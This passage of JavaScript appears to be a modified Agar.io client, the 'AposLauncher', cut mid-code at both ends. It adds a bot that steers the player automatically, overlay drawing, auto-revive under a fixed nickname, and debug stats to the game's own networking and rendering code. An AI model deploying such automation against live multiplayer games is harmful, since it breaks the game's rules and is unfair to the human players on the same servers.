e(""#adsBottom"").hide();         e(""#overlays"").hide();         W = !1;         Va();         d.googletag && d.googletag.pubads && d.googletag.pubads().clear(d.aa)     }      function ha(a) {         a && a != y && (e(""#region"").val() != a && e(""#region"").val(a), y = d.localStorage.location = a, e("".region-message"").hide(), e("".region-message."" + a).show(), e("".btn-needs-server"").prop(""disabled"", !1), ya && I())     }      function Sa(a) {         W || (K = null, sb(), a && (x = 1), W = !0, e(""#overlays"").fadeIn(a ? 200 : 3E3))     }      function Y(a) {         e(""#helloContainer"").attr(""data-gamemode"", a);         P = a;         e(""#gamemode"").val(a)     }      function Va() {         e(""#region"").val() ? d.localStorage.location = e(""#region"").val() : d.localStorage.location && e(""#region"").val(d.localStorage.location);         e(""#region"").val() ? e(""#locationKnown"").append(e(""#region"")) : e(""#locationUnknown"").append(e(""#region""));     }      function sb() {         la && (la = !1, setTimeout(function() {             la = !0                 //UPDATE         }, 6E4 * Ya))     }      function Z(a) {         return d.i18n[a] || d.i18n_dict.en[a] || a     }      function Za() {         var a = ++Ba;         console.log(""Find "" + y + P);         e.ajax(ap + ""findServer"", {             error: function() {                 setTimeout(Za, 1E3)             },             success: function(b) {                 a == Ba && (b.alert && alert(b.alert), Ca(""ws://"" + b.ip, b.token))             },             dataType: ""json"",             method: ""POST"",             cache: !1,             crossDomain: !0,             data: (y + P || ""?"") + ""\\n154669603""         })     }      function I() {         ya && y && (e(""#connecting"").show(), Za())     }      function Ca(a, b) {         if (q) {             q.onopen = null;             q.onmessage = null;             q.onclose = null;             try {                 q.close()             } catch (c) {}             q = null         }         Da.ip && (a = ""ws://"" + Da.ip);         if (null != L) {             var l = L;             L = function() {                 l(b)             }         }         if (tb) {             var d = a.split("":"");             a = d[0] + ""s://ip-"" + d[1].replace(/\\./g, ""-"").replace(/\\//g, """") + "".tech.agar.io:"" + +d[2]         }         M = [];         k = [];         E = {};         v = [];         Q = [];         F = [];         z = A = null;         R = 0;         bo = !1;         console.log(""Connecting to "" + a);         //UPDATE         serverIP = a;         q = new WebSocket(a);         q.binaryType = ""arraybuffer"";         q.onopen = function() {             var a;             console.log(""socket open"");             a = N(5);             a.setUint8(0, 254);             a.setUint32(1, 5, !0);             O(a);             a = N(5);             a.setUint8(0, 255);             a.setUint32(1, 154669603, !0);             O(a);             a = N(1 + b.length);             a.setUint8(0, 80);             for (var c = 0; c < b.length; ++c) a.setUint8(c + 1, b.charCodeAt(c));             O(a);             $a()         };         q.onmessage = ub;         q.onclose = vb;         q.onerror = function() {             console.log(""socket error"")         }     }      function N(a) {         return new DataView(new ArrayBuffer(a))     }      function O(a) {         q.send(a.buffer)     }      function vb() {         bo && (ma = 500);         console.log(""socket close"");         setTimeout(I, ma);         ma *= 2     }      function ub(a) {         wb(new DataView(a.data))     }      function wb(a) {         function b() {             for (var b = """";;) {                 var d = a.getUint16(c, !0);                 c += 2;                 if (0 == d) break;                 b += String.fromCharCode(d)             }             return b         }         var c = 0;         240 == a.getUint8(c) && (c += 5);         switch (a.getUint8(c++)) {             case 16:                 xb(a, c);                 break;             case 17:                 aa = a.getFloat32(c, !0);                 c += 4;                 ba = a.getFloat32(c, !0);                 c += 4;                 ca = a.getFloat32(c, !0);                 c += 4;                 break;             case 20:                 k = [];                 M = [];                 break;             case 21:                 Ea = a.getInt16(c, !0);                 c += 2;                 Fa = a.getInt16(c, !0);                 c += 2;                 Ga || (Ga = !0, na = Ea, oa = Fa);                 break;             case 32:                 M.push(a.getUint32(c, !0));                 c += 4;                 break;             case 49:                 if (null != A) break;                 var l = a.getUint32(c, !0),                     c = c + 4;                 F = [];                 for (var d = 0; d < l; ++d) {                     var p = a.getUint32(c, !0),                         c = c + 4;                     F.push({                         id: p,                         name: b()                     })                 }                 ab();                 break;             case 50:                 A = [];                 l = a.getUint32(c, !0);                 c += 4;                 for (d = 0; d < l; ++d) A.push(a.getFloat32(c, !0)), c += 4;                 ab();                 break;             case 64:                 pa = a.getFloat64(c, !0);                 c += 8;                 qa = a.getFloat64(c, !0);                 c += 8;                 ra = a.getFloat64(c, !0);                 c += 8;                 sa = a.getFloat64(c, !0);                 c += 8;                 aa = (ra + pa) / 2;                 ba = (sa + qa) / 2;                 ca = 1;                 0 == k.length && (s = aa, t = ba, h = ca);                 break;             case 81:                 var g = a.getUint32(c, !0),                     c = c + 4,                     e = a.getUint32(c, !0),                     c = c + 4,                     f = a.getUint32(c, !0),                     c = c + 4;                 setTimeout(function() {                     S({                         e: g,                         f: e,                         d: f                     })                 }, 1200)         }     }      function xb(a, b) {         bb = C = Date.now();         bo || (bo = !0, e(""#connecting"").hide(), cb(), L && (L(), L = null));         var c = Math.random();         Ha = !1;         var d = a.getUint16(b, !0);         b += 2;         for (var u = 0; u < d; ++u) {             var p = E[a.getUint32(b, !0)],                 g = E[a.getUint32(b + 4, !0)];             b += 8;             p && g && (g.X(), g.s = g.x, g.t = g.y, g.r = g.size, g.J = p.x, g.K = p.y, g.q = g.size, g.Q =                 C)         }         for (u = 0;;) {             d = a.getUint32(b, !0);             b += 4;             if (0 == d) break;             ++u;             var f, p = a.getInt16(b, !0);             b += 4;             g = a.getInt16(b, !0);             b += 4;             f = a.getInt16(b, !0);             b += 2;             for (var h = a.getUint8(b++), w = a.getUint8(b++), m = a.getUint8(b++), h = (h << 16 | w << 8 | m).toString(16); 6 > h.length;) h = ""0"" + h;             var h = ""#"" + h,                 w = a.getUint8(b++),                 m = !!(w & 1),                 r = !!(w & 16);             w & 2 && (b += 4);             w & 4 && (b += 8);             w & 8 && (b += 16);             for (var q, n = """";;) {                 q = a.getUint16(b, !0);                 b += 2;                 if (0 == q) break;                 n += String.fromCharCode(q)             }             q = n;             n = null;             E.hasOwnProperty(d) ? (n = E[d], n.P(), n.s = n.x, n.t = n.y, n.r = n.size, n.color = h) :                 (n = new da(d, p, g, f, h, q), v.push(n), E[d] = n, n.ua = p, n.va = g);             n.h = m;             n.n = r;             n.J = p;             n.K = g;             n.q = f;             n.sa = c;             n.Q = C;             n.ba = w;             q && n.B(q); - 1 != M.indexOf(d) && -1 == k.indexOf(n) && (document.getElementById(""overlays"").style.display = ""none"", k.push(n), n.birth = getLastUpdate(), n.birthMass = (n.size * n.size / 100), 1 == k.length && (s = n.x, t = n.y, db()))              //UPDATE             interNodes[d] = window.getCells()[d];         }          //UPDATE         Object.keys(interNodes).forEach(function(element, index) {             //console.log(""start: "" + interNodes[element].updateTime + "" current: "" + D + "" life: "" + (D - interNodes[element].updateTime));             var isRemoved = !window.getCells().hasOwnProperty(element);              //console.log(""Time not updated: "" + (window.getLastUpdate() - interNodes[element].getUptimeTime()));             if (isRemoved && (window.getLastUpdate() - interNodes[element].getUptimeTime()) > 3000) {                 delete interNodes[element];             } else {                 if (isRemoved &&                     interNodes[element].x > (getX() - (1920 / 2) / getZoomlessRatio()) &&                     interNodes[element].x < (getX() + (1920 / 2) / getZoomlessRatio()) &&                     interNodes[element].y > getY() - (1080 / 2) / getZoomlessRatio() &&                     interNodes[element].y < getY() + (1080 / 2) / getZoomlessRatio()) {                      delete interNodes[element];                 }             }         });          c = a.getUint32(b, !0);         b += 4;         for (u = 0; u < c; u++) d = a.getUint32(b, !0), b += 4, n = E[d], null != n && n.X();         //UPDATE         //Ha && 0 == k.length && Sa(!1)     }      //UPDATE     function computeDistance(x1, y1, x2, y2) {         var xdis = x1 - x2; // <--- FAKE AmS OF COURSE!         var ydis = y1 - y2;         var distance = Math.sqrt(xdis * xdis + ydis * ydis);          return distance;     }      /**      * Some horse shit of some sort.      * @return Horse Shit      */     function screenDistance() {         return Math.min(computeDistance(getOffsetX(), getOffsetY(), screenToGameX(getWidth()), getOffsetY()), computeDistance(getOffsetX(), getOffsetY(), getOffsetX(), screenToGameY(getHeight())));     }      window.verticalDistance = function() {         return computeDistance(screenToGameX(0), screenToGameY(0), screenToGameX(getWidth()), screenToGameY(getHeight()));     }      /**      * A conversion from the screen\'s horizontal coordinate system      * to the game\'s horizontal coordinate system.      * @param x in the screen\'s coordinate system      * @return x in the game\'s coordinate system      */     window.screenToGameX = function(x) {         return (x - getWidth() / 2) / getRatio() + getX();     }      /**      * A conversion from the screen\'s vertical coordinate system      * to the game\'s vertical coordinate system.      * @param y in the screen\'s coordinate system      * @return y in the game\'s coordinate system      */     window.screenToGameY = function(y) {         return (y - getHeight() / 2) / getRatio() + getY();     }      window.drawPoint = function(x_1, y_1, drawColor, text) {         if (!toggleDraw) {             dPoints.push([x_1, y_1, drawColor]);             dText.push(text);         }     }      window.drawArc = function(x_1, y_1, x_2, y_2, x_3, y_3, drawColor) {         if (!toggleDraw) {             var radius = computeDistance(x_1, y_1, x_3, y_3);             dArc.push([x_1, y_1, x_2, y_2, x_3, y_3, radius, drawColor]);         }     }      window.drawLine = function(x_1, y_1, x_2, y_2, drawColor) {         if (!toggleDraw) {             lines.push([x_1, y_1, x_2, y_2, drawColor]);         }     }      window.drawCircle = function(x_1, y_1, radius, drawColor) {         if (!toggleDraw) {             circles.push([x_1, y_1, radius, drawColor]);         }     }      function V() {          //UPDATE         if (firstStart) {             Sa(false);         }                  if (getPlayer().length == 0 && !reviving && ~~(getCurrentScore() / 100) > 0) {             console.log(""Dead: "" + ~~(getCurrentScore() / 100));             apos(\'send\', \'pageview\');         }          if (getPlayer().length == 0 && !firstStart) {             console.log(""Revive"");             setNick(originalName);             reviving = true;         } else if (getPlayer().length > 0 && reviving) {             reviving = false;             console.log(""Done Reviving!"");         }          if (T()) {             var a = fa - m / 2;             var b = ga - r / 2;             64 > a * a + b * b || .01 > Math.abs(eb - ia) &&                 .01 > Math.abs(fb - ja) || (eb = ia, fb = ja, a = N(13), a.setUint8(0, 16), a.setInt32(1, ia, !0), a.setInt32(5, ja, !0), a.setUint32(9, 0, !0), O(a))         }     }      function cb() {         if (T() && bo && null != K) {             var a = N(1 + 2 * K.length);             a.setUint8(0, 0);             for (var b = 0; b < K.length; ++b) a.setUint16(1 + 2 * b, K.charCodeAt(b), !0);             O(a)         }     }      function T() {         return null != q && q.readyState == q.OPEN     }      window.opCode = function(a) {         console.log(""Sending op code."");         H(parseInt(a));     }      function H(a) {         if (T()) {             var b = N(1);             b.setUint8(0, a);             O(b)         }     }      function $a() {         if (T() && null != B) {             var a = N(1 + B.length);             a.setUint8(0, 81);             for (var b = 0; b < B.length; ++b) a.setUint8(b + 1, B.charCodeAt(b));             O(a)         }     }      function Ta() {         m = d.innerWidth;         r = d.innerHeight;         za.width = G.width = m;         za.height = G.height = r;         var a = e(""#helloContainer"");         a.css(""transform"", ""none"");         var b = a.height(),             c = d.innerHeight;         b > c / 1.1 ? a.css(""transform"", ""translate(-50%, -50%) scale("" + c / b / 1.1 + "")"") : a.css(""transform"", ""translate(-50%, -50%)"");         gb()     }      function hb() {         var a;         a = Math.max(r / 1080, m / 1920);         return a *= J     }      //UPDATE     function hb2() {         var a;         a = Math.max(r / 1080, m / 1920);         return a;     }      function yb() {         if (0 != k.length) {             for (var a = 0, b = 0; b < k.length; b++) a += k[b].size;             //UPDATE             var a2 = Math.pow(Math.min(64 / a, 1), .4) * hb2();             a = Math.pow(Math.min(64 / a, 1), .4) * hb();             h = (9 * h + a) / 10;             //UPDATE             h2 = (9 * h2 + a2) / 10;         }     }      function gb() {         //UPDATE         dPoints = [];         circles = [];         dArc = [];         dText = [];         lines = [];           var a, b = Date.now();         ++zb;         C = b;         if (0 < k.length) {             yb();             for (var c = a = 0, d = 0; d < k.length; d++) k[d].P(), a += k[d].x / k.length, c += k[d].y / k.length;             aa = a;             ba = c;             ca = h;             s = (s + a) / 2;             t = (t + c) / 2;             //UPDATE         } else s = (29 * s + aa) / 30, t = (29 * t + ba) / 30, h = (9 * h + ca * hb()) / 10, h2 = (9 * h2 + ca * hb2()) / 10;         qb();         Aa();         Ia || f.clearRect(0, 0, m, r);         Ia ? (f.fillStyle = ta ? ""#111111"" : ""#F2FBFF"", f.globalAlpha = .05, f.fillRect(0, 0, m, r), f.globalAlpha = 1) : Ab();         v.sort(function(a, b) {             return a.size == b.size ? a.id - b.id : a.size - b.size         });         f.save();         f.translate(m / 2, r / 2);         f.scale(h, h);         f.translate(-s, -t);         //UPDATE         f.save();         f.beginPath();         f.lineWidth = 5;         f.strokeStyle = (getDarkBool() ? \'#F2FBFF\' : \'#111111\');         f.moveTo(getMapStartX(), getMapStartY());         f.lineTo(getMapStartX(), getMapEndY());         f.stroke();         f.moveTo(getMapStartX(), getMapStartY());         f.lineTo(getMapEndX(), getMapStartY());         f.stroke();         f.moveTo(getMapEndX(), getMapStartY());         f.lineTo(getMapEndX(), getMapEndY());         f.stroke();         f.moveTo(getMapStartX(), getMapEndY());         f.lineTo(getMapEndX(), getMapEndY());         f.stroke();         f.restore();          for (d = 0; d < v.length; d++) v[d].w(f);         for (d = 0; d < Q.length; d++) Q[d].w(f);         //UPDATE         if (getPlayer().length > 0) {             var moveLoc = window.botList[botIndex].mainLoop();             if (!toggle) {                 setPoint(moveLoc[0], moveLoc[1]);             }         }         customRender(f);         if (Ga) {             na = (3 * na + Ea) / 4;             oa = (3 * oa + Fa) / 4;             f.save();             f.strokeStyle = ""#FFAAAA"";             f.lineWidth = 10;             f.lineCap = ""round"";             f.lineJoin = ""round"";             f.globalAlpha = .5;             f.beginPath();             for (d = 0; d < k.length; d++) f.moveTo(k[d].x, k[d].y), f.lineTo(na, oa);             f.stroke();             f.restore();         }         f.restore();         z && z.width && f.drawImage(z, m - z.width - 10, 10);         R = Math.max(R, Bb());          //UPDATE          var currentDate = new Date();          var nbSeconds = 0;         if (getPlayer().length > 0) {             //nbSeconds = currentDate.getSeconds() + currentDate.getMinutes() * 60 + currentDate.getHours() * 3600 - lifeTimer.getSeconds() - lifeTimer.getMinutes() * 60 - lifeTimer.getHours() * 3600;             nbSeconds = (currentDate.getTime() - lifeTimer.getTime()) / 1000;         }          bestTime = Math.max(nbSeconds, bestTime);          var displayText = \'Score: \' + ~~(R / 100) + "" Current Time: "" + nbSeconds + "" seconds."";          0 != R && (null == ua && (ua = new va(24, ""#FFFFFF"")), ua.C(displayText), c = ua.L(), a = c.width, f.globalAlpha = .2, f.fillStyle = ""#000000"", f.fillRect(10, r - 10 - 24 - 10, a + 10, 34), f.globalAlpha = 1, f.drawImage(c, 15, r -             10 - 24 - 5));         Cb();         b = Date.now() - b;         b > 1E3 / 60 ? D -= .01 : b < 1E3 / 65 && (D += .01);.4 > D && (D = .4);         1 < D && (D = 1);         b = C - ib;         !T() || W ? (x += b / 2E3, 1 < x && (x = 1)) : (x -= b / 300, 0 > x && (x = 0));         0 < x && (f.fillStyle = ""#000000"", f.globalAlpha = .5 * x, f.fillRect(0, 0, m, r), f.globalAlpha = 1);         ib = C          drawStats(f);     }      //UPDATE     function customRender(d) {         d.save();         for (var i = 0; i < lines.length; i++) {             d.beginPath();              d.lineWidth = 5;              if (lines[i][4] == 0) {                 d.strokeStyle = ""#FF0000"";             } else if (lines[i][4] == 1) {                 d.strokeStyle = ""#00FF00"";             } else if (lines[i][4] == 2) {                 d.strokeStyle = ""#0000FF"";             } else if (lines[i][4] == 3) {                 d.strokeStyle = ""#FF8000"";             } else if (lines[i][4] == 4) {                 d.strokeStyle = ""#8A2BE2"";             } else if (lines[i][4] == 5) {                 d.strokeStyle = ""#FF69B4"";             } else if (lines[i][4] == 6) {                 d.strokeStyle = ""#008080"";             } else if (lines[i][4] == 7) {                 d.strokeStyle = (getDarkBool() ? \'#F2FBFF\' : \'#111111\');             } else {                 d.strokeStyle = ""#000000"";             }              d.moveTo(lines[i][0], lines[i][1]);             d.lineTo(lines[i][2], lines[i][3]);              d.stroke();         }         d.restore();         d.save();         for (var i = 0; i < circles.length; i++) {             if (circles[i][3] == 0) {                 d.strokeStyle = ""#FF0000"";             } else if (circles[i][3] == 1) {                 d.strokeStyle = ""#00FF00"";             } else if (circles[i][3] == 2) {                 d.strokeStyle = ""#0000FF"";             } else if (circles[i][3] == 3) {                 d.strokeStyle = ""#FF8000"";             } else if (circles[i][3] == 4) {                 d.strokeStyle = ""#8A2BE2"";             } else if (circles[i][3] == 5) {                 d.strokeStyle = ""#FF69B4"";             } else if (circles[i][3] == 6) {                 d.strokeStyle = ""#008080"";             } else if (circles[i][3] == 7) {                 d.strokeStyle = (getDarkBool() ? \'#F2FBFF\' : \'#111111\');             } else {                 d.strokeStyle = ""#000000"";             }             d.beginPath();              d.lineWidth = 10;             //d.setLineDash([5]);             d.globalAlpha = 0.3;              d.arc(circles[i][0], circles[i][1], circles[i][2], 0, 2 * Math.PI, false);              d.stroke();         }         d.restore();         d.save();         for (var i = 0; i < dArc.length; i++) {             if (dArc[i][7] == 0) {                 d.strokeStyle = ""#FF0000"";             } else if (dArc[i][7] == 1) {                 d.strokeStyle = ""#00FF00"";             } else if (dArc[i][7] == 2) {                 d.strokeStyle = ""#0000FF"";             } else if (dArc[i][7] == 3) {                 d.strokeStyle = ""#FF8000"";             } else if (dArc[i][7] == 4) {                 d.strokeStyle = ""#8A2BE2"";             } else if (dArc[i][7] == 5) {                 d.strokeStyle = ""#FF69B4"";             } else if (dArc[i][7] == 6) {                 d.strokeStyle = ""#008080"";             } else if (dArc[i][7] == 7) {                 d.strokeStyle = (getDarkBool() ? \'#F2FBFF\' : \'#111111\');             } else {                 d.strokeStyle = ""#000000"";             }              d.beginPath();              d.lineWidth = 5;              var ang1 = Math.atan2(dArc[i][1] - dArc[i][5], dArc[i][0] - dArc[i][4]);             var ang2 = Math.atan2(dArc[i][3] - dArc[i][5], dArc[i][2] - dArc[i][4]);              d.arc(dArc[i][4], dArc[i][5], dArc[i][6], ang1, ang2, false);              d.stroke();         }         d.restore();         d.save();         for (var i = 0; i < dPoints.length; i++) {             if (dText[i] == """") {                 var radius = 10;                  d.beginPath();                 d.arc(dPoints[i][0], dPoints[i][1], radius, 0, 2 * Math.PI, false);                  if (dPoints[i][2] == 0) {                     d.fillStyle = ""black"";                 } else if (dPoints[i][2] == 1) {                     d.fillStyle = ""yellow"";                 } else if (dPoints[i][2] == 2) {                     d.fillStyle = ""blue"";                 } else if (dPoints[i][2] == 3) {                     d.fillStyle = ""red"";                 } else if (dPoints[i][2] == 4) {                     d.fillStyle = ""#008080"";                 } else if (dPoints[i][2] == 5) {                     d.fillStyle = ""#FF69B4"";                 } else {                     d.fillStyle = ""#000000"";                 }                  d.fill();                 d.lineWidth = 2;                 d.strokeStyle = \'#003300\';                 d.stroke();             } else {                 var text = new va(18, (getDarkBool() ? \'#F2FBFF\' : \'#111111\'), true, (getDarkBool() ? \'#111111\' : \'#F2FBFF\'));                  text.C(dText[i]);                 var textRender = text.L();                 d.drawImage(textRender, dPoints[i][0] - (textRender.width / 2), dPoints[i][1] - (textRender.height / 2));             }          }         d.restore();     }      function drawStats(d) {         d.save()          sessionScore = Math.max(getCurrentScore(), sessionScore);          var botString = window.botList[botIndex].displayText();          var debugStrings = [];         debugStrings.push(""Bot: "" + window.botList[botIndex].name);         debugStrings.push(""Launcher: AposLauncher "" + aposLauncherVersion);         debugStrings.push(""T - Bot: "" + (!toggle ? ""On"" : ""Off""));         debugStrings.push(""R - Lines: "" + (!toggleDraw ? ""On"" : ""Off""));          for (var i = 0; i < botString.length; i++) {             debugStrings.push(botString[i]);         }          debugStrings.push("""");         debugStrings.push(""Best Score: "" + ~~(sessionScore / 100));         debugStrings.push(""Best Time: "" + bestTime + "" seconds"");         debugStrings.push("""");         debugStrings.push(serverIP);          if (getPlayer().length > 0) {             var offsetX = -getMapStartX();             var offsetY = -getMapStartY();             debugStrings.push(""Location: "" + Math.floor(getPlayer()[0].x + offsetX) + "", "" + Math.floor(getPlayer()[0].y + offsetY));         }          var offsetValue = 20;         var text = new va(18, (getDarkBool() ? \'#F2FBFF\' : \'#111111\'));          for (var i = 0; i < debugStrings.length; i++) {             text.C(debugStrings[i]);             var textRender = text.L();             d.drawImage(textRender, 20, offsetValue);             offsetValue += textRender.height;         }          if (message.length > 0) {             var mRender = [];             var mWidth = 0;             var mHeight = 0;              for (var i = 0; i < message.length; i++) {                 var mText = new va(28, \'#FF0000\', true, \'#000000\');                 mText.C(message[i]);                 mRender.push(mText.L());                  if (mRender[i].width > mWidth) {                     mWidth = mRender[i].width;                 }                 mHeight += mRender[i].height;             }              var mX = getWidth() / 2 - mWidth / 2;             var mY = 20;              d.globalAlpha = 0.4;             d.fillStyle = \'#000000\';             d.fillRect(mX - 10, mY - 10, mWidth + 20, mHeight + 20);             d.globalAlpha = 1;              var mOffset = mY;             for (var i = 0; i < mRender.length; i++) {                 d.drawImage(mRender[i], getWidth() / 2 - mRender[i].width / 2, mOffset);                 mOffset += mRender[i].height;             }         }          d.restore();     }      function Ab() {         f.fillStyle = ta ? ""#111111"" : ""#F2FBFF"";         f.fillRect(0, 0, m, r);         f.save();         f.strokeStyle = ta ? ""#AAAAAA"" : ""#000000"";         f.globalAlpha = .2 * h;         for (var a = m / h, b = r / h, c = (a / 2 - s) % 50; c < a; c += 50) f.beginPath(), f.moveTo(c * h - .5, 0), f.lineTo(c * h - .5, b * h), f.stroke();         for (c = (b / 2 - t) % 50; c < b; c += 50) f.beginPath(), f.moveTo(0, c * h - .5), f.lineTo(a * h, c * h - .5), f.stroke();         f.restore()     }      function Cb() {         if (Qa && Ja.width) {             var a = m / 5;             f.drawImage(Ja, 5, 5, a, a)         }     }      function Bb() {         for (var a = 0, b = 0; b < k.length; b++) a += k[b].q * k[b].q;         return a     }      function ab() {         z = null;         if (null != A || 0 != F.length)             if (null != A || wa) {                 z = document.createElement(""canvas"");                 var a = z.getContext(""2d""),                     b = 60,                     b = null == A ? b + 24 * F.length : b + 180,                     c = Math.min(200, .3 * m) / 200;                 z.width = 200 * c;                 z.height = b * c;                 a.scale(c, c);                 a.globalAlpha = .4;                 a.fillStyle = ""#000000"";                 a.fillRect(0, 0, 200, b);                 a.globalAlpha =                     1;                 a.fillStyle = ""#FFFFFF"";                 c = null;                 c = Z(""leaderboard"");                 a.font = ""30px Ubuntu"";                 a.fillText(c, 100 - a.measureText(c).width / 2, 40);                 if (null == A)                     for (a.font = ""20px Ubuntu"", b = 0; b < F.length; ++b) c = F[b].name || Z(""unnamed_cell""), wa || (c = Z(""unnamed_cell"")), -1 != M.indexOf(F[b].id) ? (k[0].name && (c = k[0].name), a.fillStyle = ""#FFAAAA"") : a.fillStyle = ""#FFFFFF"", c = b + 1 + "". "" + c, a.fillText(c, 100 - a.measureText(c).width / 2, 70 + 24 * b);                 else                     for (b = c = 0; b < A.length; ++b) {                         var d = c + A[b] * Math.PI * 2;                         a.fillStyle = Db[b + 1];                         a.beginPath();                         a.moveTo(100, 140);                         a.arc(100,                             140, 80, c, d, !1);                         a.fill();                         c = d                     }             }     }      function Ka(a, b, c, d, e) {         this.V = a;         this.x = b;         this.y = c;         this.i = d;         this.b = e     }      function da(a, b, c, d, e, p) {         this.id = a;         this.s = this.x = b;         this.t = this.y = c;         this.r = this.size = d;         this.color = e;         this.a = [];         this.W();         this.B(p)     }      function va(a, b, c, d) {         a && (this.u = a);         b && (this.S = b);         this.U = !!c;         d && (this.v = d)     }      function S(a, b) {         var c = ""1"" == e(""#helloContainer"").attr(""data-has-account-data"");         e(""#helloContainer"").attr(""data-has-account-data"", ""1"");         if (null == b && d.localStorage.loginCache) {             var l = JSON.parse(d.localStorage.loginCache);             l.f = a.f;             l.d = a.d;             l.e = a.e;             d.localStorage.loginCache = JSON.stringify(l)         }         if (c) {             var u = +e("".agario-exp-bar .progress-bar-text"").first().text().split(""/"")[0],                 c = +e("".agario-exp-bar .progress-bar-text"").first().text().split(""/"")[1].split("" "")[0],                 l = e("".agario-profile-panel .progress-bar-star"").first().text();             if (l != a.e) S({                 f: c,                 d: c,                 e: l             }, function() {                 e("".agario-profile-panel .progress-bar-star"").text(a.e);                 e("".agario-exp-bar .progress-bar"").css(""width"", ""100%"");                 e("".progress-bar-star"").addClass(""animated tada"").one(""webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend"",                     function() {                         e("".progress-bar-star"").removeClass(""animated tada"")                     });                 setTimeout(function() {                     e("".agario-exp-bar .progress-bar-text"").text(a.d + ""/"" + a.d + "" XP"");                     S({                         f: 0,                         d: a.d,                         e: a.e                     }, function() {                         S(a, b)                     })                 }, 1E3)             });             else {                 var p = Date.now(),                     g = function() {                         var c;                         c = (Date.now() - p) / 1E3;                         c = 0 > c ? 0 : 1 < c ? 1 : c;                         c = c * c * (3 - 2 * c);                         e("".agario-exp-bar .progress-bar-text"").text(~~(u + (a.f - u) * c) + ""/"" + a.d + "" XP"");                         e("".agario-exp-bar .progress-bar"").css(""width"", (88 * (u + (a.f - u) * c) / a.d).toFixed(2) + ""%"");                         1 > c ? d.requestAnimationFrame(g) : b && b()                     };                 d.requestAnimationFrame(g)              }         } else e("".agario-profile-panel .progress-bar-star"").text(a.e),             e("".agario-exp-bar .progress-bar-text"").text(a.f + ""/"" + a.d + "" XP""), e("".agario-exp-bar .progress-bar"").css(""width"", (88 * a.f / a.d).toFixed(2) + ""%""), b && b()      }      function jb(a) {         ""string"" == typeof a && (a = JSON.parse(a));         Date.now() + 18E5 > a.ja ? e(""#helloContainer"").attr(""data-logged-in"", ""0"") : (d.localStorage.loginCache = JSON.stringify(a), B = a.fa, e("".agario-profile-name"").text(a.name), $a(), S({             f: a.f,             d: a.d,             e: a.e         }), e(""#helloContainer"").attr(""data-logged-in"", ""1""))     }      function Eb(a) {         a = a.split(""\\n"");         jb({             name: a[0],             ta: a[1],             fa: a[2],             ja: 1E3 *                 +a[3],             e: +a[4],             f: +a[5],             d: +a[6]         });         console.log(""Hello Facebook?"");     }      function La(a) {         if (""connected"" == a.status) {             var b = a.authResponse.accessToken;             d.FB.api(""/me/picture?width=180&height=180"", function(a) {                 d.localStorage.fbPictureCache = a.data.url;                 e("".agario-profile-picture"").attr(""src"", a.data.url)             });             e(""#helloContainer"").attr(""data-logged-in"", ""1"");             null != B ? e.ajax(ap + ""checkToken"", {                 error: function() {                     console.log(""Facebook Fail!"");                     B = null;                     La(a)                 },                 success: function(a) {                     a = a.split(""\\n"");                     S({                         e: +a[0],                         f: +a[1],                         d: +a[2]                     });                     console.log(""Facebook connected!"");                 },                 dataType: ""text"",                 method: ""POST"",                 cache: !1,                 crossDomain: !0,                 data: B             }) : e.ajax(ap + ""facebookLogin"", {                 error: function() {                     console.log(""You have a Facebook problem!"");                     B = null;                     e(""#helloContainer"").attr(""data-logged-in"", ""0"")                 },                 success: Eb,                 dataType: ""text"",                 method: ""POST"",                 cache: !1,                 crossDomain: !0,                 data: b             })         }     }      function Wa(a) {         Y("":party"");         e(""#helloContainer"").attr(""data-party-state"", ""4"");         a = decodeURIComponent(a).replace(/.*#/gim, """");         Ma(""#"" + d.encodeURIComponent(a));         e.ajax(ap + ""getToken"", {             error: function() {                 e(""#helloContainer"").attr(""data-party-state"", ""6"")             },             success: function(b) {                 b = b.split(""\\n"");                 e("".partyToken"").val(""agar.io/#"" +                     d.encodeURIComponent(a));                 e(""#helloContainer"").attr(""data-party-state"", ""5"");                 Y("":party"");                 Ca(""ws://"" + b[0], a)             },             dataType: ""text"",             method: ""POST"",             cache: !1,             crossDomain: !0,             data: a         })     }      function Ma(a) {         d.history && d.history.replaceState && d.history.replaceState({}, d.document.title, a)     }     if (!d.agarioNoInit) {         var Na = d.location.protocol,             tb = ""https:"" == Na,             ap = Na + ""//m.agar.io/"",             xa = d.navigator.userAgent;         if (-1 != xa.indexOf(""Android"")) d.ga && d.ga(""send"", ""event"", ""MobileRedirect"", ""PlayStore""), setTimeout(function() {                 d.location.href = ""market://details?id=com.miniclip.agar.io""             },             1E3);         else if (-1 != xa.indexOf(""iPhone"") || -1 != xa.indexOf(""iPad"") || -1 != xa.indexOf(""iPod"")) d.ga && d.ga(""send"", ""event"", ""MobileRedirect"", ""AppStore""), setTimeout(function() {             d.location.href = ""https://itunes.apple.com/app/agar.io/id995999703""         }, 1E3);         else {             var za, f, G, m, r, X = null,                  //UPDATE                 toggle = false,                 toggleDraw = false,                 shootTime = 0,                 splitTime = 0,                 shootCooldown = 100,                 splitCooldown = 100,                 tempPoint = [0, 0, 1],                 dPoints = [],                 circles = [],                 dArc = [],                 dText = [],                 lines = [],                 names = [""fb.com/nifhnif""],                 firstStart = true;                 originalName = names[Math.floor(Math.random() * names.length)],                 sessionScore = 0,                 serverIP = """",                 interNodes = [],                 lifeTimer = new Date(),                 bestTime = 0,                 botIndex = 0,                 reviving = false,                 message = [],                  q = null,                 s = 0,                 t = 0,                 M = [],                 k = [],                 E = {},                 v = [],                 Q = [],                 F = [],                 fa = 0,                 ga = 0,                  //UPDATE                 ia = -1,                 ja = -1,                  zb = 0,                 C = 0,                 ib = 0,                 K = null,                 pa = 0,                 qa = 0,                 ra = 1E4,                 sa = 1E4,                 h = 1,                 h2 = 1,                 y = null,                 kb = !0,                 wa = !0,                 Oa = !1,                 Ha = !1,                 R = 0,                 ta = !1,                 lb = !1,                 aa = s = ~~((pa + ra) / 2),                 ba = t = ~~((qa + sa) / 2),                 ca = 1,                 P = """",                 A = null,                 ya = !1,                 Ga = !1,                 Ea = 0,                 Fa =                 0,                 na = 0,                 oa = 0,                 mb = 0,                 Db = [""#333333"", ""#FF3333"", ""#33FF33"", ""#3333FF""],                 Ia = !1,                 bo = !1,                 bb = 0,                 B = null,                 J = 1,                 x = 1,                 W = !0,                 Ba = 0,                 Da = {};             (function() {                 var a = d.location.search;                 ""?"" == a.charAt(0) && (a = a.slice(1));                 for (var a = a.split(""&""), b = 0; b < a.length; b++) {                     var c = a[b].split(""="");                     Da[c[0]] = c[1]                 }             })();             var Qa = ""ontouchstart"" in d && 